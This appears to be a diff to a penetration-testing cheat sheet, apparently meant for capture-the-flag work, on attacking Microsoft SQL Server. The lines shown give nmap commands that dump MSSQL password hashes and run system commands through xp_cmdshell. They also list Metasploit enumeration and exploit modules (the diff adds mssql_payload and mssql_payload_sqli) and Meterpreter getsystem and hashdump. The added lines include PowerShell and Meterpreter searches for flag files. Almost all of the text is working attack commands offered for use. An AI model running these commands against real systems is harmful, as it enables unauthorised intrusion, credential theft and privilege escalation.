@@ -393,12 +393,13 @@ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<name>,mss
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<name>,mssql.password=<>,mssql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
 
 ## Metasploit
-use auxiliary/scanner/mssql/mssql_login
 use auxiliary/admin/mssql/mssql_enum
 use auxiliary/admin/mssql/mssql_enum_sql_logins
 use auxiliary/admin/mssql/mssql_exec
 use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
+exploit/windows/mssql/mssql_payload
+exploit/windows/mssql/mssql_payload_sqli
 ```
 
 #Meterpreter 
@@ -413,6 +414,20 @@ getsystem
 
 ####Hashdump
 hashdump
+
+#### Search 
+search -d C:\\ -f flag*.
+
+#Powershell
+
+```bash
+#search for all files and ignore access or other issues 
+Get-ChildItem -Path C:\ -Filter flag*.txt -Recurse -ErrorAction SilentlyContinue -Force
+
+#search for all files and highlight issues 
+Get-ChildItem -Path C:\ -Filter flag*.txt -Recurse -Force
+
+```
 
 
 
